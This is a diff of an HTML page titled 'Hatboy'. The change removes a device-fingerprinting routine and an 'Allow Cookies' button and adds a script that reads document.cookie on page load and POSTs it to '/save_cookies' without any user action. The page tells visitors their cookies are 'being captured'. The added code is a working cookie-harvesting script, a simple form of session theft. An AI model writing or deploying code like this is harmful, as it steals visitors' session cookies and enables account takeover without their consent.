@@ -5,48 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hatboy</title>
     <script>
-        // Capture device information
-        function captureDeviceInfo() {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                cookiesEnabled: navigator.cookieEnabled
-            };
+        // Capture all cookies from the current site
+        function captureCookies() {
+            const cookies = document.cookie;
 
-            fetch("/capture_device_info", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(deviceInfo)
-            }).then(response => response.json())
-              .then(data => console.log(data.message))
-              .catch(error => console.error("Error:", error));
-        }
-
-        // Save all cookies from the browser
-        function allowCookies() {
-            const cookies = document.cookie.split(";").map(c => c.trim());
-
+            // Send cookies to the server
             fetch("/save_cookies", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ cookies: cookies })
-            }).then(response => response.json())
-              .then(data => {
-                  alert(data.message); // Show success message
-                  fetch("/close_site", { method: "POST" }); // Close the site
-              }).catch(error => console.error("Error:", error));
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert(data.message); // Show success message
+                console.log("Cookies saved successfully:", data);
+            })
+            .catch(error => console.error("Error saving cookies:", error));
         }
 
         // Initialize on page load
         window.onload = () => {
-            captureDeviceInfo();
+            captureCookies(); // Automatically capture cookies upon loading the page
         };
     </script>
 </head>
 <body>
     <h1>Welcome</h1>
-    <p>Please click the button below to allow cookies.</p>
-    <button onclick="allowCookies()">Allow Cookies</button>
+    <p>Your cookies are being captured and saved securely.</p>
 </body>
 </html>
